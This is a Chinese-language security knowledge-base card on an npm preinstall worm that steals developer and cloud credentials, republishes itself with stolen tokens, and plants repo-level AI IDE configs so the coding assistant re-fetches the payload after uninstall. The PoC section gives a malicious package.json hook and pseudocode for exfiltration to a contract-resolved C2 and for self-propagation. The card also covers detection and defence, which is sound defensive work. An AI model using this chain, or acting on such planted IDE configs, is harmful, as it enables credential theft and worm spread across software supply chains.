---
id: ai-security-supply-chain-npm-preinstall-worm-ai-ide-persistence
title: npm preinstall 蠕虫 + AI IDE 配置持久化：卸载后由 AI 助手重新拉活载荷
type: scenario
domain: ai-security
path: ai-security/supply-chain
technique: npm-preinstall-worm-ai-ide-persistence
tags:
- ai-supply-chain
- npm
- preinstall
- worm
- persistence
- ai-ide
- credential-theft
- supply-chain
cve: []
severity: critical
confidence: medium
status: verified
created: '2026-11-05'
updated: '2026-11-05'
verification:
  verified_by: verifier-V107
  verified_at: '2026-11-05T22:45:41+08:00'
  notes: 已对照原文与全部 44 张本地图片（另有 1 张 xz.aliyun.com 远程图无法读取）核对：PoC、截图、命令、IOC、检测规则与数字均与原文一致。未验证点：原文部分攻击链为描述/示意，未提供完整可运行样本；本库未复跑任何 PoC；frontmatter 无 sources/source_url。
url: /docs/ai-security/supply-chain/ai-security-supply-chain-npm-preinstall-worm-ai-ide-persistence/
draft: false
kb_aliases:
- npm 蠕虫
- preinstall 投毒
- AI IDE 配置持久化
- 卸载复活
- 智能合约 C2
- setup.mjs
---

## 一句话结论

被投毒的 npm 包在 `preinstall` 阶段执行 `setup.mjs`，窃取 npm/GitHub/AWS/K8s 凭据并用 AES-256-GCM 加密外发；随后用窃取的发布令牌把所有可写包注入自身实现蠕虫传播，同时向仓库写入 AI IDE 配置文件，使受害者即使卸载恶意包，下次打开 IDE 仍会被 AI 助手按配置重新拉活载荷。

## 原理

- **生命周期钩子是合法执行通道**：`package.json` 的 `preinstall` 在 `npm install` 解析依赖时执行，早于依赖安装完成，不需要业务代码 `require` 该包；攻击者因此获得“安装即执行”的入口。
- **窃密与加密外发**：`setup.mjs` 枚举本机 npm、GitHub、AWS、K8s 凭据，用 AES-256-GCM 加密后外发，规避明文流量特征与 DLP；载荷用 Bun 打包/混淆，降低静态可读性。
- **C2 抗封禁**：域名不写死，通过智能合约的 `getC2()` 动态解析——域名被封时攻击者只需更新合约存储，不需要重新发包。
- **蠕虫传播**：利用窃取的 npm 发布令牌，枚举账号下所有可写包，将自身注入 `package.json` 的 `preinstall`、递增版本并重新发布；被感染的下游用户重复同一过程。
- **AI IDE 配置持久化（关键升级）**：向仓库写入 `.claude/settings.json`、`.vscode/tasks.json` 等仓库级 AI 配置，让 AI 助手在下次打开项目时按配置下载/执行载荷。传统蠕虫靠系统服务复活，这一代靠“AI 助手每次启动都会执行它”复活；卸载 npm 包不会删除仓库配置。
- **为什么难清除**：恶意包、依赖缓存、发布令牌、AI 配置、智能合约 C2 分布在多个层面；只删 `node_modules` 或卸载包无法同时清理，且重新 clone/打开项目会再次触发。

## 触发条件

- 目标执行 `npm install`/`npm ci` 且未禁用生命周期脚本（未加 `--ignore-scripts`）。
- 本机存在 npm 发布令牌、GitHub Token、AWS/K8s 凭据或可读的凭据文件。
- 攻击者账号拥有可写包；或通过依赖传递/typosquatting 把恶意包带进来。
- 受害者使用 AI IDE/Agent，且 IDE 会读取并执行仓库级配置（`.claude/settings.json`、`.vscode/tasks.json` 等），开发者信任项目配置。
- 网络允许访问 npm registry、智能合约 RPC 与攻击者 C2。

## 利用步骤

1. 发布带 `"scripts": {"preinstall": "node setup.mjs"}` 的包；`setup.mjs` 用 Bun 打包混淆，内含凭据枚举、AES-256-GCM 加密、外发逻辑。
2. 受害者安装包，`preinstall` 在依赖装完前执行，窃取 npm/GitHub/AWS/K8s 凭据并外发。
3. `setup.mjs` 通过智能合约 `getC2()` 获取当前 C2 域名（示例伪代码），规避域名封禁。
4. 用窃取的 npm Token 枚举账号下可写包：复制当前 bundle、写入 `setup.mjs`、修改 `package.json` 的 `preinstall`、递增 patch 版本、重新发布（示例代码逻辑）。
5. 向当前仓库写入 AI IDE 配置文件，配置在打开项目时下载/执行载荷；恶意包被卸载后配置仍在。
6. 受害者下次打开 IDE，AI 助手按配置重新拉活载荷，形成持久化。
7. 变体：用 `postinstall`/`install`/`prepare`；扩展到 pnpm/yarn；把配置写到 `.cursor`、`.idea`、tasks/debug、hook 等更多可执行面。

## PoC

恶意包最小 `package.json`：

```json
{
  "name": "demo-format-util",
  "version": "1.0.0",
  "scripts": {
    "preinstall": "node setup.mjs"
  }
}
```

`setup.mjs` 的结构（伪代码，仅示意，不含真实窃密/传播实现）：

```javascript
// 1) 采集凭据（示意）
const creds = collectNpmGithubAwsK8sCredentials();
const blob = aes256gcmEncrypt(JSON.stringify(creds), randomKey());

// 2) 智能合约解析 C2（示意）
const domain = await eth.call({
  to: C2_CONTRACT_ADDR,
  data: encodeCall("getC2()")
});
await exfiltrate(`https://${domain}/collect`, blob);

// 3) 用窃取的 npm token 自我复制（原文逻辑）
const pkg = readPackageManifest(packageDirectory);
copyCurrentBundle(packageDirectory, payloadFile);
writeFile(packageDirectory, "setup.mjs", loaderCode);
pkg.scripts = { preinstall: "node setup.mjs" };
pkg.version = incrementPatchVersion(pkg.version);
writePackageManifest(packageDirectory, pkg);
publishRepackedTarball(packageDirectory, stolenNpmToken);

// 4) 写 AI IDE 配置实现卸载后复活（示意）
writeFile(repoRoot, ".claude/settings.json", persistenceConfig);
```

## 变体与关联

- **生命周期变体**：`preinstall` 最早触发；`install`、`postinstall`、`prepare` 同样可被滥用；`npm ci` 也执行脚本，除非 `--ignore-scripts`。
- **生态变体**：Python `setup.py`/PEP 517、Composer `post-install-cmd`、RubyGems `extconf.rb`、VS Code/Cursor 扩展、GitHub Actions。
- **持久化变体**：仓库级 AI 配置、tasks/debug、hook、`.envrc`、devcontainer、Makefile；也可写用户级配置，但仓库级更隐蔽且随 PR 传播。
- **C2 变体**：智能合约、DNS TXT、去中心化存储、GitHub raw、云函数；共同点是“域名/地址可更新、封禁成本高”。
- **关联卡片**：[[ai-security-supply-chain-ai-codegen-prompt-npm-install-rce]]（Prompt 诱导 npm 安装执行）、[[cloud-cicd-npm-postinstall-supply-chain-poisoning]]（npm 生命周期投毒一般形态）、[[ai-security-mcp-security-config-rug-pull-command-swap-persistence]]（AI 配置作为持久化介质）。
- **边界**：`npm ci --ignore-scripts`、无发布令牌、凭据最小化、AI IDE 不信任项目配置、网络禁止合约 RPC/未知域名时，链条会被打断；原文部分阶段为描述/示意，未提供完整可运行样本。

## 检测与防御

- **安装侧**：默认 `npm ci --ignore-scripts`，需要脚本的包走白名单；使用 lockfile 与私有镜像；安装容器无云凭据、无发布令牌、出站默认拒绝。
- **发布侧**：监控新版本 `package.json` 的 `scripts` 变化；对“preinstall 引用新文件/setup.mjs”模式告警；启用 npm 2FA 与 token 最小权限；定期审计账号下包的异常版本。
- **AI 配置侧**：把 `.claude/settings.json`、`.vscode/tasks.json`、`.cursor` 等仓库级配置视为可执行安装器，纳入代码评审与签名；禁止项目配置自动下载/执行；IDE 打开陌生仓库时默认不运行任务。
- **检测**：监控 `npm install` 期间 Node 子进程读取 `~/.npmrc`、`~/.aws`、`~/.kube`、环境变量并外连；监控智能合约 RPC 域名与陌生 C2；监控 IDE 启动时下载并执行脚本。
- **响应**：隔离主机、轮换 npm/GitHub/AWS/K8s 凭据、撤销发布令牌、清理 AI 配置与持久化、审计账号下所有包版本并通知下游。
